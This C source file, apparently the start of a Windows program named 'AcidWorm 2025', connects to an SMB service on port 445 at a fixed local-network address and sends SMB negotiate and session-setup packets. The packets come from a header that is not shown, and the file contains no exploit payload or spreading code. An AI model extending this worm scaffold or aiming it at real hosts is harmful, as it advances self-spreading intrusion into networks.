#include <WS2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

#include "requests.h"


int main()
{

	printf("[*] AcidWorm 2025\r\n");
    
	
	const char* localIP = "192.168.1.2";
	int localPort = 242;
	
	const char* targetIP = "192.168.1.1";
	int targetPort = 445;

	unsigned char recvBuff[500] = { 0 };

	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("[*] WSAStartup failed. \r\n");
		return 0;
	}

	int sock = socket(AF_INET, SOCK_STREAM, 0);

	int timeout = 5000; // milliseconds
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

	// Bind to local IP and port
	struct sockaddr_in localAddress;
	localAddress.sin_family = AF_INET;
	localAddress.sin_port = htons(localPort);
	inet_pton(AF_INET, localIP, &localAddress.sin_addr);

	if (bind(sock, (struct sockaddr*)&localAddress, sizeof(localAddress)) != 0) 
	{
		printf("[*] bind failed  %i\r\n", WSAGetLastError());
		closesocket(sock);
		return 1;
	}

	
	struct sockaddr_in targetAddress;
	targetAddress.sin_family = AF_INET;
	targetAddress.sin_port = htons(targetPort);
	inet_pton(AF_INET, targetIP, &targetAddress.sin_addr);


	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
	{
		printf("[*] connect failed. targetIP: %s, port: %i\r\n error: %i", targetIP, targetPort, WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}


	////set local and target IP in packets
	//memcpy(&smbNegotiateProtocol[26], localIP, strlen(localIP) -1);
	//memcpy(&smbNegotiateProtocol[30], targetIP, strlen(targetIP) -1);
	//memcpy(&smbSessionSetupAndX[26], localIP, strlen(localIP -1));
	//memcpy(&smbSessionSetupAndX[30], targetIP, strlen(targetIP) -1);

	////set local and target port in packets
	//memcpy(&smbNegotiateProtocol[34], &localPort, sizeof(localPort));
	//memcpy(&smbNegotiateProtocol[36], &targetPort, sizeof(targetPort));
	//memcpy(&smbSessionSetupAndX[34], &localPort, sizeof(localPort));
	//memcpy(&smbSessionSetupAndX[36], &targetPort, sizeof(targetPort));

	int bytesSent = 0;
	int bytesRecvieved = 0;

	bytesSent = send(sock, smbNegotiateProtocol, sizeof(smbNegotiateProtocol), 0);
	if (bytesSent <= 0)
	{
		printf("[*] smbNegotiateProtocol send failed. targetIP: %s, port: %i\r\n", targetIP, targetPort);
	}

	printf("[*] sent %i bytes to %s\r\n", bytesSent, targetIP);

	bytesRecvieved = recv(sock, (char*)recvBuff, sizeof(recvBuff), 0);
	if (bytesRecvieved <= 0)
	{
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	printf("[*] recieved %i bytes from %s\r\n", bytesSent, targetIP);


	bytesSent = send(sock, smbSessionSetupAndX, sizeof(smbSessionSetupAndX), 0);
	if (bytesSent <= 0)
	{
		printf("[*] smbSessionSetupAndX send failed. targetIP: %s, port: %i\r\n", targetIP, targetPort);
	}

	printf("[*] sent %i bytes to %s\r\n", bytesSent, targetIP);

	bytesRecvieved = recv(sock, (char*)recvBuff, sizeof(recvBuff), 0);
	if (bytesRecvieved <= 0)
	{
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	printf("[*] recieved %i bytes from %s\r\n", bytesRecvieved, targetIP);



	closesocket(sock);
	WSACleanup();

	while (true)
	{
		__asm
		{
			nop
		}
	}

	return 1;
}